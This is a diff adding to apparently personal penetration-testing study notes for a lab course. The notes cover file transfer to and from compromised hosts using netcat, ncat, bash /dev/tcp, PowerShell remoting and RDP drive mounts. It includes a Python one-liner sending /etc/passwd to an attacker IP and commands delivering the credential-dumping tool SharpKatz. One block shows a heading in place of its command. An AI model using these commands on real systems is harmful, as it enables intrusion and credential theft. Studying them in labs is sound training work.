@@ -499,3 +499,120 @@ __Uploading a File Using a Python One-liner__
 python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 # Miscellaneous File Transfer Methods
+
+## File Transfer with Netcat and Ncat
+
+### Netcat (Original) on Compromised Machine
+**Command:**
+```bash
+nc -l -p 8000 > SharpKatz.exe
+```
+Explanation:
+This command starts Netcat in listen mode (-l) on port 8000 (-p 8000) and redirects any data received to a file named SharpKatz.exe. This makes the compromised machine ready to receive the file.
+
+### Ncat on Compromised Machine
+Command:
+```
+ncat -l -p 8000 --recv-only > SharpKatz.exe
+```
+Explanation:
+Similar to the Netcat command, this starts Ncat in listen mode on port 8000. The --recv-only flag ensures that Ncat will close the connection after receiving the file, making it more efficient for single-file transfers.
+### Netcat (Original) on Attack Host
+
+```
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+```
+Explanation:
+wget downloads the file SharpKatz.exe from a remote URL.
+nc -q 0 connects to the compromised machine at IP 192.168.49.128 on port 8000. The -q 0 option ensures Netcat will quit immediately after sending the file.
+
+### Ncat on Attack Host
+```
+wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+```
+Explanation:
+
+wget downloads the file as before.
+ncat --send-only sends the file to the compromised machine. --send-only ensures Ncat will terminate after sending the file, avoiding any additional data transmission.
+### Netcat (Original) on Attack Host (Listen on Port 443)
+```
+sudo nc -l -p 443 -q 0 < SharpKatz.exe
+```
+Explanation:
+
+sudo is used to gain necessary permissions for listening on port 443 (a privileged port).
+nc -l -p 443 -q 0 listens on port 443 and sends the file SharpKatz.exe to any connecting client. The -q 0 option ensures the connection closes immediately after the file is sent.
+
+### Ncat on Attack Host (Listen on Port 443)
+```
+sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+### Netcat (Original) on Compromised Machine (Connect to Attack Host)
+```
+nc 192.168.49.128 443 > SharpKatz.exe
+```
+
+### Ncat on Compromised Machine (Connect to Attack Host)
+```
+ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
+```
+Explanation:
+Similar to the Netcat command but using Ncat with --recv-only to ensure it closes the connection after the file transfer is complete.
+
+### Bash /dev/tcp File Transfer (Compromised Machine Connecting to Netcat)
+```
+cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+```
+Explanation:
+This uses Bash’s /dev/tcp pseudo-device to open a TCP connection to the attack host and writes the received data into SharpKatz.exe.
+
+## PowerShell Session File Transfer
+
+### Confirm WinRM Port TCP 5985 is Open on DATABASE01
+```
+Test-NetConnection -ComputerName DATABASE01 -Port 5985
+```
+Checks if the WinRM port (5985 for HTTP) is open and accessible on DATABASE01. This verifies if PowerShell Remoting is possible.
+
+### Create a PowerShell Remoting Session to DATABASE01
+```
+Create a PowerShell Remoting Session to DATABASE01
+```
+Explanation:
+Establishes a PowerShell Remoting session to DATABASE01 and stores the session object in the $Session variablw
+
+### Copy File from Localhost to DATABASE01 Session
+```
+Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+Explanation:
+Copies samplefile.txt from the local machine to the DATABASE01 remote session, placing it on the Desktop of the Administrator user.
+
+### Copy File from DATABASE01 Session to Localhost
+```
+Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+```
+
+## RDP File Transfer
+Mounting a Linux Folder Using rdesktop
+```
+rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+```
+Explanation:
+Uses rdesktop to mount a local Linux directory (/home/user/rdesktop/files) on the remote RDP session, making the local files accessible from the remote Windows environment.
+
+### Mounting a Linux Folder Using xfreerdp
+```
+xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+```
+Explanation:
+Uses xfreerdp to mount a local folder (/home/plaintext/htb/academy/filetransfer) on the remote RDP session, similarly allowing file transfers.
+
+### Accessing the Directory
+To access the mounted directory in the RDP session, navigate to:
+```
+\\tsclient\
+```
+This will show the local directories mounted via rdesktop or xfreerdp, allowing file transfers between the local and remote systems.
